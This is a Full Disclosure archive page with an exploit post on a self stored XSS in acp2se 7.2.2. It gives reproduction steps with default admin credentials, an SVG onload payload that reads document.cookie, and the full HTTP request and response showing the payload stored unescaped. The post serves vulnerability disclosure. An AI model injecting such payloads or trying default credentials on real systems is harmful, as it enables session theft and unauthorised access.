---
title: Self Stored XSS - acp2sev7.2.2
url: https://seclists.org/fulldisclosure/2025/Feb/16
source: Full Disclosure
date: 2025-02-22
fetch_date: 2025-10-06T20:47:21.388944
---

# Self Stored XSS - acp2sev7.2.2

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](15)
[By Date](date.html#16)
[![Next](/images/right-icon-16x16.png)](17)

[![Previous](/images/left-icon-16x16.png)](15)
[By Thread](index.html#16)
[![Next](/images/right-icon-16x16.png)](17)

![](/shared/images/nst-icons.svg#search)

# Self Stored XSS - acp2sev7.2.2

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Wed, 19 Feb 2025 08:30:06 +0000

---

```
# Exploit Title: Self Stored XSS - acp2sev7.2.2
# Date: 02/2025
# Exploit Author: Andrey Stoykov
# Version: 7.2.2
# Tested on: Ubuntu 22.04
# Blog:
https://msecureltd.blogspot.com/2025/02/friday-fun-pentest-series-19-self.html

Self Stored XSS #1:

Steps to Reproduce:

1. Visit "http://192.168.58.168/acp2se/mul/muladmin.php"; and login with
"admin" / "adminpass"
2. In the field "Put the name of the new Admin" enter the following payload
"><svg onload=prompt(document.cookie)>

// HTTP POST request

POST /acp2se/mul/muladmin.php HTTP/1.1
Host: 192.168.58.168
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0)
Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 71
Origin: http://192.168.58.168
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://192.168.58.168/acp2se/mul/muladmin.php
Cookie: PHPSESSID=ofq25o83upb0tvch4759uo78f5
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name="><svg onload=prompt(document.cookie)>&submit=Submit

// HTTP Response

HTTP/1.1 200 OK
Date: Wed, 19 Feb 2025 08:22:26 GMT
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
Perl/v5.16.3
X-Powered-By: PHP/5.6.40
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0,
pre-check=0
Pragma: no-cache
Content-Length: 1210
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

[...]
<table border='1' cellpadding='2' cellspacing='2' width='850'>
<tr bgcolor='#C0C0C0'>
 <th width='850'>You have added a default Admin. His name is: "><svg
onload=prompt(document.cookie)> .</br> The default password will be:
<b>Admin</b>
[...]
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](15)
[By Date](date.html#16)
[![Next](/images/right-icon-16x16.png)](17)

[![Previous](/images/left-icon-16x16.png)](15)
[By Thread](index.html#16)
[![Next](/images/right-icon-16x16.png)](17)

### Current thread:

* **Self Stored XSS - acp2sev7.2.2** *Andrey Stoykov (Feb 20)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")